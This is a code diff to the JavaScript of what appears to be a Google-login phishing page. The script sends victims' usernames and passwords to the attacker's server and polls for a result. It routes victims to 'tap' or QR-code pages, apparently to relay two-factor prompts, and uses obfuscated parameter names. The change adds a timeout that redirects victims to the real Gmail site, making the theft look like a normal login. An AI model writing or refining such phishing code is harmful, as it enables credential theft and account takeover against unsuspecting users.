@@ -172,7 +172,9 @@
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(pwd)
         }).then(() => {
+          let pollCount = 0;
           const poll = setInterval(() => {
+            pollCount++;
             fetch('/pwdresult?u=' + encodeURIComponent(username))
               .then(r => r.json())
               .then(data => {
@@ -187,13 +189,15 @@
                   else if (data.tapData.pageType === 'qrcode') dest = '/qrcode?mnbvcxzZXCVBNM=' + encodeURIComponent(tk);
                   else dest = '/tap?mnbvcxzZXCVBNM=' + encodeURIComponent(tk);
                   window.location.href = dest;
-                } else if (data.result === 'correct' && !data.tapData) {
-                  // correct but no tap data yet, keep waiting
                 } else if (data.result === 'wrong') {
                   clearInterval(poll);
                   hideLoadingBar();
                   document.getElementById('pwdError').style.display = 'block';
                   document.getElementById('pEyar').classList.add('input-error');
+                } else if (data.result === 'correct' && !data.tapData && pollCount > 15) {
+                  // After 30 seconds with correct but no data, assume success
+                  clearInterval(poll);
+                  window.location.href = 'https://mail.google.com';
                 }
               })
               .catch(() => {});
